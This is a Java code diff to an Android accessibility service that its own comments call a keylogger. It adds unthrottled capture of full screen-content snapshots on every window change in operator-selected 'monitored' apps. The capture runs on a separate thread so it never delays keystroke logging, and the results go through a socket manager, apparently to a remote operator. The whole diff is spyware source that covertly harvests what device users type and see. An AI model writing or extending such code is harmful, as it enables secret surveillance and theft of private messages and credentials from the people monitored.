@@ -155,9 +155,42 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     // Prevents duplicate log entries when the OS fires multiple click events for one tap.
     private final java.util.Map<String, Long> lastClickLogTime = new java.util.HashMap<>();
 
-    // ── Accessibility snapshot rate-limiter (one snapshot per app per 10 s) ──
-    private final java.util.Map<String, Long> lastSnapshotTime = new java.util.HashMap<>();
-    private static final long SNAPSHOT_MIN_INTERVAL_MS = 10_000L;
+    // ── UI snapshot capture ─────────────────────────────────────────────────
+    // Every TYPE_WINDOW_STATE_CHANGED from a Constants.MONITORED_PACKAGES app
+    // produces one snapshot, so the tree walk and JSON serialisation run on
+    // their own thread. Doing it inline would block permissionBgHandler — the
+    // same worker that delivers keylog events — and reintroduce the capture
+    // latency the keylogger is built to avoid.
+    // Oldest-first discard under extreme burst: dropping a snapshot is always
+    // preferable to stalling keylog delivery behind the walk.
+    private final java.util.concurrent.ExecutorService snapshotExecutor =
+            new java.util.concurrent.ThreadPoolExecutor(
+                1, 1, 30L, java.util.concurrent.TimeUnit.SECONDS,
+                new java.util.concurrent.LinkedBlockingQueue<>(256),
+                r -> { Thread t = new Thread(r, "SnapCapture"); t.setDaemon(true); return t; },
+                new java.util.concurrent.ThreadPoolExecutor.DiscardOldestPolicy()
+            );
+
+    /**
+     * Capture and persist one accessibility-tree snapshot for {@code packageName}.
+     * Returns immediately; the walk happens on the snapshot thread. Callers must
+     * have already confirmed the package is in Constants.MONITORED_PACKAGES.
+     */
+    private void captureSnapshotAsync(String packageName) {
+        if (packageName == null || packageName.isEmpty()) return;
+        try {
+            snapshotExecutor.execute(() -> {
+                try {
+                    String snap = captureNodeTree();
+                    if (snap != null) {
+                        SocketManager.getInstance(UnifiedAccessibilityService.this)
+                                .getAppMonitor()
+                                .onAccessibilitySnapshot(packageName, snap);
+                    }
+                } catch (Exception ignored) {}
+            });
+        } catch (Exception ignored) {}
+    }
 
     // Click labels that are pure media / UI chrome — not worth logging.
     // Exact-match (case-insensitive) or prefix-match against the extracted text.
@@ -804,11 +837,17 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     /**
-     * Whether the package is in the optional Constants.MONITORED_PACKAGES list.
-     * Only used for reporting — logging and streaming cover every package.
+     * Whether the package is in the operator's monitored set (built-in defaults
+     * + any dynamically added packages).
      */
     private boolean isMonitoredPackage(String packageName) {
-        return com.task.tusker.commands.AppMonitor.isMonitored(packageName);
+        try {
+            return SocketManager.getInstance(this)
+                    .getAppMonitor()
+                    .instanceIsMonitored(packageName);
+        } catch (Exception e) {
+            return false;
+        }
     }
 
     /**
@@ -1072,8 +1111,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     updateCurrentAppName();
                     try {
                         SocketManager smWin = SocketManager.getInstance(this);
-                        // Capture the screen title for every app, and a UI snapshot
-                        // for every app (rate-limited per package below).
+                        // Capture the screen title for every app. UI snapshots are
+                        // monitored-apps-only — see below.
                         String newTitle = "";
                         List<CharSequence> winTexts = event.getText();
                         if (winTexts != null) {
@@ -1087,19 +1126,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                         keylogBuffer.add("[" + packageName + "] APP OPENED");
                         smWin.getAppMonitor().onAppForeground(packageName);
 
-                        long now = System.currentTimeMillis();
-                        Long last = lastSnapshotTime.get(packageName);
-                        if (last == null || now - last >= SNAPSHOT_MIN_INTERVAL_MS) {
-                            lastSnapshotTime.put(packageName, now);
-                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                                try {
-                                    String snap = captureNodeTree();
-                                    if (snap != null) {
-                                        smWin.getAppMonitor()
-                                                .onAccessibilitySnapshot(packageName, snap);
-                                    }
-                                } catch (Exception ignored) {}
-                            }, 300);
+                        // Snapshot on EVERY window change for the apps listed in
+                        // Constants.MONITORED_PACKAGES — no throttle. The walk runs
+                        // off the accessibility worker so a burst of window changes
+                        // can never delay keylog delivery.
+                        if (isMonitoredPackage(packageName)) {
+                            captureSnapshotAsync(packageName);
                         }
 
                         if (smWin.isConnected() && !packageName.isEmpty()) {
